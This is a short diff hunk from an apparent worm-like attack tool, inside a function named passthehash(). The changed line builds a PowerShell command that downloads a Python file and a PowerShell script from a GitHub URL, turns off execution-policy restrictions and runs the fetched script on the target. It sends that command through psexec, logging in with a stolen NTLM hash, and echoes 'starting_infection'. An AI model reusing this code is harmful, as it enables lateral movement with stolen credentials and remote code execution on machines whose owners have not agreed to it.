@@ -276,7 +276,7 @@ def passthehash():
             # remote_cmd = r"""powershell.exe powershell.exe 'echo starting_infection...; (New-Object System.Net.WebClient).DownloadFile(''https://github.com/mahmoodsh36/test2/raw/main/main.py'' , ''C:\main.py''); python C:\main.py; echo exiting...; sleep 3' """
             # this is the command used to connect to the target and run 'remote_cmd'
             #connect_cmd = f"./{psexec} -hashes ':{passhash}' -port 445 mahmo@10.0.2.4 '{remote_cmd}'"
-            remote_cmd = r"""powershell.exe powershell.exe 'echo starting_infection...; (New-Object System.Net.WebClient).DownloadFile(''https://github.com/mahmoodsh36/test2/raw/main/main.py'' , ''C:\main.py''); (New-Object System.Net.WebClient).DownloadFile(''https://github.com/mahmoodsh36/test2/raw/main/main.ps1'' , ''C:\main.ps1''); .\main.ps1; """
+            remote_cmd = r"""powershell.exe powershell.exe 'echo starting_infection...; (New-Object System.Net.WebClient).DownloadFile(''https://github.com/mahmoodsh36/test2/raw/main/main.py'' , ''C:\main.py''); (New-Object System.Net.WebClient).DownloadFile(''https://github.com/mahmoodsh36/test2/raw/main/main.ps1'' , ''C:\main.ps1''); Set-ExecutionPolicy unrestricted; powershell.exe C:\main.ps1' """
             connect_cmd = f"powershell.exe .\\{psexec} -hashes ':{passhash}' -port {port} '{username}@{ip}' \"{remote_cmd}\""
             my_print(f'attempting to connect to {username}@{ip}:{port} with hash {passhash}')
             my_print(f'running command: {connect_cmd}')
